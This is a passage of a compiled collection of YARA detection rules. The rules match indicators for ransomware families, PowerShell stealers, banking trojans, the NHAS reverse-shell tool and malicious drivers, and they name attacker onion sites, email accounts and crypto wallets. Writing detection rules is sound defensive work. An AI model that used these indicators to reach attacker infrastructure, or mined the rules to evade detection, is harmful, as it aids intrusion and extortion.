		$pk7 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9uYkHzaizNXg/S11ncTTLybkMtqrKW8gg6TyzbGWnRNROl9O+l1VZBLG0xiMt1mZbuStl8Lt3l1vlkMa92kgLjN+UfKmq3KhBEheN2uMmR0WpwV83kceVRmzr5lug4RyQ/xA6/OXK4NptDIT4L6CUTBWMyk2mmY0Cq9HyyrjdnHeAXWAcQGFEac7W4jTjONZqI+lgScPewS+cPFnz1hAD0IAqzj5X2mZVSfFGR3tDoIe42jw5wb6W2yi8zb3mgKrGtTBbw0Ppj0UgKrmdN5iFmfUQHLEzKAakDggLcBtrW1o5+4WMaZOLw8maU5byvjXu3F3i3GdQe8SKTYcVK5OQIDAQAB" ascii wide
		$pk8 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAugqZ4ATE9+9FqununW/DBvGosnUX/bNxQzMYUmE14GJIbNa6vwYSNXOlG09mvdAqZqD3lXihWDjy25+gzqSeS+Fs2qNyTdfGPA8iu2xx5RRUXKLGFThxtIzg3fohAK3+LxJVhxtuITAT38IHacc7dVLHsrddu4UDjiHGFdvXjB55Nwe5cu1BYylHsARMYycBA2FwLP57cKvc2/C3OXBAF6qbsVXBcyFhrKOOYA/+5IjFfEhgHy2FLHRf8lmPQPbSlrM6dk+W4D5KVqOPx/eFp0geUJJlmlre3flI29qWS20bkGqAEz9j07y69HGYN9Nt7+DRgBwrpNo/EkZkuaSTtQIDAQAB" ascii wide
		$pk9 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuuAQlnowSGaSi2XgnwaHQAFZ6e7C0SwpAyyLTncJ4l5cwFbM+mwnV+iV3a+ert8WqOmW1aKOCjTPXrXNoirQgboVpLfhIIT1uOOss4O8lodRxgB6QrLCI7PYMZ+8VgIdEPPzsjmTFLxFc7DERxnSjhGdRQIjZNjm7bGScJD0MayDL9KTkVdJtC+C9n5dwEwg6XtQbwLDeaGZaByOgB/zR6tlcPQCNU9rj1qfcVrI/dFW4br/NnJbqrH714z+dvCa18IJTcu3kW74CAilvHrl5qFDd8CCQhjLrjQDPxAoCba9aXKr6dwt34/MU0tVRTYjzMAxR4yTh3oEjVT+HifvVwIDAQAB" ascii wide
		$pk10 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcPjnPl8bI1A0iudX70FKkTjnLjHyetHN2kAIcyOG10K8vm67n/Ma9mAnoDggD3D6UtAbwjvHwPW1m9WF+MrnBXmBizE0JpwOLtVFcHeVLJXlYn/C5RNZziTCwjauH6TlT7Mo/oHfg7nX4IXEuaeAZz8g9ioeJ1Lydi9ZZM1gmdNk8KuKR0zrrJ6MMAGrhMtblLFVwtMn7IlNjT/BgSL4pDyNa++wI5P4R2rMykJwGu/7o2kKE2IFimtFDyZ5a+CX46cdKt7uo5eKFiqf/jTes9/y5AgoS69mt4fRvWFhP7qHXRO2gG8XAc+9suhiuVUWZTAu3xXz5VsmBtk8pzcpwIDAQAB" ascii wide
		$pk11 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwMQXFMtYf60KrbUVwNVoPhhrCTNMY3Zv+/WULZRZfJ4dMhYozDxtRVdtBDKtuYuHCGLu/Ymf9wKFFXgVH3En7qI1sU2UdjNR4086X8oSTMUn/GwEAEIZAHtSFuk6AXcXW+eO0yxPF+lt5AZcNnJocWBVZ8RWGvsQdtGgtZalttAynROC4RUGkvD1h1ssMteHWneFLpfzSPGlbu0s0cemsrTPmhexGIenup/YjNdmhbfvvYE9kZfPebGtZHw6oQXWcG7sAlvkGciJl3Eo9FznNj0K+v8WQW5L/UbosZaYVJbxlbtySvqUqZbkLKsmp91tr9bvTiDMZuXZS7iHVqchUQIDAQAB" ascii wide
		$pk12 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxbKVxwYe4PpnPm0XtuqShDqFWCFRBw0tYo2vmLwVPlwa+0+ox8+nF0mzWC3ZZT2XkGSodszosOoocfKAwOjQnA+4/Hokl4hgG6K8O7wWuWlvgo4fkcZShy2cMY9FaC6e4bMfurlDFt7OVrKKWAyEGv49Etq6LNoyl5ddM/XmspG52gscRoIcOTwBL4bD8nVcamZXqE4j2mS62HicQ6q9YgRVs1PLbgVPbg8c2rFzpN1e8wZdPtvyGON0m3CmxsYa63yianbnBAS4WnxEnoI7eCZZNkblr+kZB4J9War5VYHu9lFw4XWeuHget/Rn8oGCJOMHkZMz23NpUVaX9htQAwIDAQAB" ascii wide
		$url1 = "://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd.onion" ascii wide
		$url2 = "://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion" ascii wide
		$url3 = "://2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid.onion" ascii wide
		$url4 = "://aoczppoxmfqqthtwlwi4fmzlrv6aor3isn6ffaiic55wrfumxslx3vyd.onion" ascii wide
		$url5 = "://b4twqa2mvob3s6uvuyfra5xk3qgps2v5kkt7k2qnb7rpdu3j4fkntead.onion" ascii wide
		$url6 = "://b6v4ojs7jfvftvcoagjxp7qz33yeljydqy6afzsh26vqbzcjwz4b3zad.onion" ascii wide
		$url7 = "://htnpafzbvddr2llstwbjouupddflqm7y7cr7tcchbeo6rmxpqoxcbqqd.onion" ascii wide
		$url8 = "://id7seexjn4bojn5rvo4lwcjgufjz7gkisaidckaux3uvjc7l7xrsiqad.onion" ascii wide
		$url9 = "://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion" ascii wide
		$url10 = "://odf3dt34tkqndw5h2l5gt2gwwd3jct5rwwjusbd3vlin2jueyv2qkgid.onion" ascii wide
		$url11 = "://rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion" ascii wide
		$url12 = "://sty5r4hhb5oihbq2mwevrofdiqbgesi66rvxr5sr573xgvtuvr4cs5yd.onion" ascii wide
		$url13 = "://xqoykemmcivwtpxh3a6pu3w7sstr2y7hapxdiv4caaxidurmwwbjx2id.onion" ascii wide
		$url14 = "://y4722ss64vel5hmph75te7lx2x5xz463322ypjirm5ytxviijtdpybid.onion" ascii wide

	condition:
		(1 of ( $pk* ) and 1 of ( $url* ) )
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Koxic
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "4c4ff722-cac1-5967-9e79-681f47566e96"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L571-L580"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ca4d0e85cf4c7a134609262e21d5cef98100ba0a046d17ffe51bf3975dc7cae9"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "wilhelmkox@tutanota.com" ascii wide nocase
		$s2 = "F3C777D22A0686055A3558917315676D607026B680DA5C8D3D4D887017A2A844F546AE59F59F" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryuk
{
	meta:
		description = "Detects files referencing identities associated with Ryuk ransomware"
		author = "ditekShen"
		id = "00cf99da-ff3c-5c91-8966-69a8afc8613a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L582-L592"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2b6106fc49dd254ca936e285fa0c2a3aee7110832686638d20d369d77f6c48f"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "WayneEvenson@protonmail.com" ascii wide nocase
		$s2 = "WayneEvenson@tutanota.com" ascii wide nocase
		$s3 = "14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lockdown
{
	meta:
		description = "Detects files referencing identities associated with LockDown / cantopen ransomware"
		author = "ditekShen"
		id = "603f0113-d77b-590c-b2a0-804c6d1fbfbc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L594-L603"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cb17bb92d6e8189a08508481b75d301a1227906815c684753859914d77d7b3e7"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "CCWhite@onionmail.org" ascii wide nocase
		$s2 = "bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Powershellwifistealer
{
	meta:
		description = "Detects email accounts used for exfiltration observed in PowerShellWiFiStealer"
		author = "ditekShen"
		id = "fa19e422-c682-5464-b034-330942daf3bd"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L691-L704"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f119b54032e2a6ca35819e811e6479b00936115d98ef6e928f4c819d04a8321f"
		score = 75
		quality = 63
		tags = ""

	strings:
		$s1 = "hajdebebreidekreide@gmail.com" ascii wide nocase
		$s2 = "usb@pterobot.net" ascii wide nocase
		$s3 = "umairdadaber@gmail.com" ascii wide nocase
		$s4 = "mrumairok@gmail.com" ascii wide nocase
		$s5 = "credsenderbot@gmail.com" ascii wide nocase
		$s6 = "easywareytb@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Powershellcookiestealer
{
	meta:
		description = "Detects email accounts used for exfiltration observed in PowerShellCookieStealer"
		author = "ditekShen"
		id = "c2bbb9a8-3e4c-5676-9676-2708a196ef8d"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L706-L715"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd404e94939acb92dd56a7d2a1f7536bcb3f520ca1e9dc614b53828afbc6dac8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "senmn0w@gmail.com" ascii wide nocase
		$s2 = "mohamed.trabelsi.ena2@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rhysida
{
	meta:
		description = "Detects files referencing identities associated with Rhysida ransomware"
		author = "ditekShen"
		id = "7ee0fb41-9267-5b65-ada3-229f2e390da6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1688-L1697"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e3e07bab2982a30a5372e6708ede6707d132d410aa5b5b1a29bdb5d06910a88e"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "SethZemlak@onionmail.org" ascii wide nocase
		$s2 = "JacquieKunze@onionmail.org" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Payola
{
	meta:
		description = "Detects files referencing identities associated with Payola ransomware"
		author = "ditekShen"
		id = "7c1fc06b-fc71-5679-befd-686b2e05e3a4"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1699-L1708"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "568141c03d14faef0cfc4f5fbdec45a5109a1ad5cbbe99e76a1db86e7ef4dc5d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "pcsupport@skiff.com" ascii wide nocase
		$s2 = "pctalk01@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Xorist
{
	meta:
		description = "Detects files referencing identities associated with Xorist ransomware"
		author = "ditekShen"
		id = "151d182c-c60a-54dd-a3d2-b32d27521b57"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1710-L1723"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "5975a730ad1a1f7e54e95ec5897aa2940ccc3ed1aa8e83b38cb7ac836c233208"
		score = 75
		quality = 67
		tags = ""

	strings:
		$s1 = "@root_backdoor_synaptics_V" ascii wide nocase
		$s2 = "@DosX_Plus" ascii wide nocase
		$s3 = "@Cinoshi_Adm" ascii wide nocase
		$s4 = "@ac3ss0r" ascii wide nocase
		$s5 = "MCwRK1Z7K4GYHt9ZrbTR2SMCEqzqQaTbRF" ascii wide
		$s6 = "0x334F093c9De6552AF4cC0B252dA82aC77FeB467D" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Blackhunt
{
	meta:
		description = "Detects files referencing identities associated with BlackHunt ransomware"
		author = "ditekShen"
		id = "87613fcc-7d9a-57ba-9653-c48760dd5ef0"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1725-L1739"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6b875d4abdedc8032f89ab3cbdf4acdc855d83b5bcc08f96b2fbc38b4a5daa7f"
		score = 75
		quality = 61
		tags = ""

	strings:
		$s1 = "onion746@onionmail.com" ascii wide nocase
		$s2 = "amike1096@gmail.com" ascii wide nocase
		$s3 = "decryptyourdata@msgsafe.io" ascii wide nocase
		$s4 = "decryptyourdata@onionmail.org" ascii wide nocase
		$s5 = "Teikobest@gmail.com" ascii wide nocase
		$s6 = "Loxoclash@gmail.com" ascii wide nocase
		$s7 = "://sdjf982lkjsdvcjlksaf2kjhlksvvnktyoiasuc92lf.onion" ascii wide nocase

	condition:
		any of them
}

rule WITHSECURELABS_SILKLOADER
{
	meta:
		description = "Detects SILKLOADER samples"
		author = "WithSecure"
		id = "bb8a543e-fdbf-5be1-901e-3e2a9965fd62"
		date = "2023-03-15"
		modified = "2023-03-15"
		reference = "https://labs.withsecure.com/publications/silkloader"
		source_url = "https://github.com/WithSecureLabs/iocs/blob/8165da82a9514abb69b4e2bb03f3983766a05b4a/SILKLOADER/silkloader.yar#L2-L20"
		license_url = "https://github.com/WithSecureLabs/iocs/blob/8165da82a9514abb69b4e2bb03f3983766a05b4a/LICENSE"
		logic_hash = "48aa249ea78e5a3bfe9934fd0dfa26b79f9e6cbe1e5b1426b84f8d8a3d77d742"
		score = 75
		quality = 75
		tags = ""
		version = "1.0"
		hash1 = "c83ac6dc96febd49c7c558e8cf85dd8bcb3a84fdc78b3ba72ebf681566dc1865"
		hash2 = "e4dadabd1cee7215ff6e31e01f6b0dd820851685836592a14f982f2c7972fc25"
		hash3 = "d77a59e6ba3a8f3c000a8a8955af77d2898f220f7bf3c0968bf0d7c8ac25a5ad"

	strings:
		$str1 = {5400520041004e005300460045005200}
		$str2 = {760062006300630073006200}

	condition:
		pe.is_pe and pe.characteristics & pe.DLL and all of them
}

rule HARFANGLAB_Allasenhamaycampaign_Executorloader
{
	meta:
		description = "Detects Delphi ExecutorLoader DLLs and executables."
		author = "HarfangLab"
		id = "0a09414d-cd86-54a4-99e4-121a7df7624b"
		date = "2024-05-28"
		modified = "2025-06-23"
		reference = "TRR240501"
		source_url = "https://github.com/HarfangLab/iocs/blob/8dc3aaf1321031ddbd35668b4033701413418f92/hl_public_reports_master.yar#L96-L114"
		license_url = "N/A"
		logic_hash = "61aa0bf180574856e57d0b26442bfa6f4b1e25844611d6eadaed529e1bb86625"
		score = 75
		quality = 55
		tags = ""
		context = "file,memory"

	strings:
		$delphi = "Embarcadero Delphi" ascii fullword
		$s1 = "\\SysWOW64\\mshta.exe" wide fullword
		$s2 = "\\System32\\mshta.exe" wide fullword
		$s3 = "RcDll" wide fullword
		$default1 = "Default_" wide fullword
		$default2 = "Default~" wide fullword

	condition:
		$delphi and all of ( $s* ) and any of ( $default* )
}

rule HARFANGLAB_Allasenhamaycampaign_Allasenha
{
	meta:
		description = "Detects AllaSenha banking trojan DLLs."
		author = "HarfangLab"
		id = "787c4e66-2053-5f14-a52e-6b0415700e8c"
		date = "2024-05-28"
		modified = "2025-06-23"
		reference = "TRR240501"
		source_url = "https://github.com/HarfangLab/iocs/blob/8dc3aaf1321031ddbd35668b4033701413418f92/hl_public_reports_master.yar#L115-L137"
		license_url = "N/A"
		logic_hash = "affe75ade6c8d9eeba00006f78678a48b1cfc5ffa9f9675fdea6ffd6cb3a02bd"
		score = 75
		quality = 80
		tags = ""
		context = "file,memory"

	strings:
		$a1 = "<|NOSenha|>" wide fullword
		$a2 = "<|SENHA|>QrCode: " wide fullword
		$a3 = "<|SENHA|>Senha 6 : " wide fullword
		$a4 = "<|SENHA|>Snh: " wide fullword
		$a5 = "<|SENHA|>Token: " wide fullword
		$a6 = "<|BB-AMARELO|>" wide fullword
		$a7 = "<|BB-AZUL|>" wide fullword
		$a8 = "<|BB-PROCURADOR|>" wide fullword
		$a9 = "<|ITAU-SNH-CARTAO|>" wide fullword
		$a10 = "<|ITAU-TK-APP|>" wide fullword
		$dga = { 76 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 78 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 7A 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 77 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 6B 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 79 00 00 00 }

	condition:
		$dga and ( 4 of ( $a* ) )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Pe_Inmem_Large
{
	meta:
		description = "Matches packed NHAS reverse_ssh PE samples in-memory during execution"
		author = "HarfangLab"
		id = "f6b38e11-c405-5623-bea3-3a8d96b435af"
		date = "2024-09-24"
		modified = "2025-06-23"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/8dc3aaf1321031ddbd35668b4033701413418f92/hl_public_reports_master.yar#L276-L294"
		license_url = "N/A"
		hash = "7798b45ffc488356f7253805dc9c8d2210552bee39db9082f772185430360574"
		logic_hash = "b9bbbbd93dc39f8c16c7f8275fa73f4c345c3ba8f21da76ae491e89d3a22c473"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "\\rprichard\\proj\\winpty\\src\\agent\\" ascii
		$s2 = "\\Users\\mail\\source\\winpty\\src\\" ascii
		$s3 = "Successfully connnected" ascii
		$s4 = "*main.decFunc" ascii fullword
		$s6 = "keepalive-rssh@golang.org" ascii fullword
		$s7 = ".(*sshFxpSetstatPacket)." ascii

	condition:
		( all of them )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Elf_Inmem_Large
{
	meta:
		description = "Matches packed NHAS reverse_ssh ELF samples in-memory during execution"
		author = "HarfangLab"
		id = "cd6f7b81-b8df-5e2b-9da6-981d1f62c131"
		date = "2024-09-24"
		modified = "2025-06-23"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/8dc3aaf1321031ddbd35668b4033701413418f92/hl_public_reports_master.yar#L295-L312"
		license_url = "N/A"
		hash = "9f97997581f513166aae47b3664ca23c4f4ea90c24916874ff82891e2cd6e01e"
		logic_hash = "54ba4fc366fb6e4a252d51528ede3ec418b369881ad98e9119d1a9650b6a1bab"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "/NHAS/reverse_ssh/cmd/client" ascii
		$s2 = "/handlers.runCommandWithPty" ascii
		$s3 = "/connection.RegisterChannelCallbacks" ascii
		$s4 = "/internal.RemoteForwardRequest" ascii
		$s7 = "main.Fork" ascii fullword

	condition:
		( all of them )
}

rule LOLDRIVERS_MAL_Driver_Crowdstrikeinc_Csagentsys_Crowdstrikefalconsensor_94B8
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - idmtdi.sys"
		author = "Florian Roth"
		id = "b3173c53-ef34-5722-8f49-dd596733c7fe"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L2-L21"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "94b87b1cdaf1d86c2bc4eacef45608d0f16fdd3b981b88cdddc16b6bc64fe25d"
		logic_hash = "9376ab5835e07d117ee3d157713339c0ffeda2479cb8183dc82cfffcbb29971d"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00430072006f007700640053007400720069006b0065002000460061006c0063006f006e002000530065006e0073006f00720020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430072006f007700640053007400720069006b0065002c00200049006e0063002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00330034002e00310034003800300036002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00330034002e00310034003800300036002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00430053004100670065006e0074002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00430072006f007700640053007400720069006b0065002000460061006c0063006f006e002000530065006e0073006f0072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00430053004100670065006e0074002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]002800630029002000430072006f007700640053007400720069006b0065002c00200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Windbgsys_Microsoftwindowsoperatingsystem_6994
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - windbg.sys"
		author = "Florian Roth"
		id = "05060e37-3c01-5b86-a3ee-6e141399164a"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L24-L59"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "6994b32e3f3357f4a1d0abe81e8b62dd54e36b17816f2f1a80018584200a1b77"
		hash = "5b932eab6c67f62f097a3249477ac46d80ddccdc52654f8674060b4ddf638e5d"
		hash = "ea50f22daade04d3ca06dedb497b905215cba31aae7b4cab4b533fda0c5be620"
		hash = "f936ec4c8164cbd31add659b61c16cb3a717eac90e74d89c47afb96b60120280"
		hash = "32882949ea084434a376451ff8364243a50485a3b4af2f2240bb5f20c164543d"
		hash = "6661320f779337b95bbbe1943ee64afb2101c92f92f3d1571c1bf4201c38c724"
		hash = "86047bb1969d1db455493955fd450d18c62a3f36294d0a6c3732c88dfbcc4f62"
		hash = "06c5ebd0371342d18bc81a96f5e5ce28de64101e3c2fd0161d0b54d8368d2f1f"
		hash = "4734a0a5d88f44a4939b8d812364cab6ca5f611b9b8ceebe27df6c1ed3a6d8a4"
		hash = "770f33259d6fb10f4a32d8a57d0d12953e8455c72bb7b60cb39ce505c507013a"
		hash = "50819a1add4c81c0d53203592d6803f022443440935ff8260ff3b6d5253c0c76"
		hash = "f9f2091fccb289bcf6a945f6b38676ec71dedb32f3674262928ccaf840ca131a"
		hash = "fa9abb3e7e06f857be191a1e049dd37642ec41fb2520c105df2227fcac3de5d5"
		hash = "139f8412a7c6fdc43dcfbbcdba256ee55654eb36a40f338249d5162a1f69b988"
		hash = "e1cb86386757b947b39086cc8639da988f6e8018ca9995dd669bdc03c8d39d7d"
		hash = "e6f764c3b5580cd1675cbf184938ad5a201a8c096607857869bd7c3399df0d12"
		hash = "bb2422e96ea993007f25c71d55b2eddfa1e940c89e895abb50dd07d7c17ca1df"
		logic_hash = "161f83c85ad516f3f06f3719a1d8ae0c841e818e50f985403133c2f77b7be894"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e0064006f007700730020004700550049002000730079006d0062006f006c00690063002000640065006200750067006700650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310039003000340031002e0036003800350020002800570069006e004200750069006c0064002e003100360030003100300031002e00300038003000300029 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310039003000340031002e003600380035 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770069006e006400620067002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074003f002000570069006e0064006f00770073003f0020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770069006e006400620067002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]003f0020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_AAF0
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "57e5655e-1313-585f-931c-d892e8952d0e"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L62-L120"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "aaf04d89fd15bc61265e545f8e1da80e20f59f90058ed343c62ee24358e3af9e"
		hash = "4b97d63ebdeda6941bb8cef5e94741c6cca75237ca830561f2262034805f0919"
		hash = "c42c1e5c3c04163bf61c3b86b04a5ec7d302af7e254990cef359ac80474299da"
		hash = "f03f0fb3a26bb83e8f8fa426744cf06f2e6e29f5220663b1d64265952b8de1a1"
		hash = "0f98492c92e35042b09032e3d9aedc357e4df94fc840217fa1091046f9248a06"
		hash = "d032001eab6cad4fbef19aab418650ded00152143bd14507e17d62748297c23f"
		hash = "2456a7921fa8ab7b9779e5665e6b42fccc019feb9e49a9a28a33ec0a4bb323c4"
		hash = "f9b01406864ab081aa77eef4ad15cb2dd2f830d1ef54f52622a59ff1aeb05ba5"
		hash = "19dfacea1b9f19c0379f89b2424ceb028f2ce59b0db991ba83ae460027584987"
		hash = "3ca5d47d076e99c312578ef6499e1fa7b9db88551cfc0f138da11105aca7c5e1"
		hash = "cf9451c9ccc5509b9912965f79c2b95eb89d805b2a186d7521d3a262cf5a7a37"
		hash = "a0931e16cf7b18d15579e36e0a69edad1717b07527b5407f2c105a2f554224b2"
		hash = "492113a223d6a3fc110059fe46a180d82bb8e002ef2cd76cbf0c1d1eb8243263"
		hash = "85b9d7344bf847349b5d58ebe4d44fd63679a36164505271593ef1076aa163b2"
		hash = "efa56907b9d0ec4430a5d581f490b6b9052b1e979da4dab6a110ab92e17d4576"
		hash = "12b0000698b79ea3c8178b9e87801cc34bad096a151a8779559519deafd4e3f0"
		hash = "4136f1eb11cc463a858393ea733d5f1c220a3187537626f7f5d63eccf7c5a03f"
		hash = "ee525b90053bb30908b5d7bf4c5e9b8b9d6b7b5c9091a26fa25d30d3ad8ef5d0"
		hash = "10ad50fcb360dcab8539ea322aaf2270565dc835b7535790937348523d723d6b"
		hash = "4d42678df3917c37f44a1506307f1677b9a689efcf350b1acce7e6f64b514905"
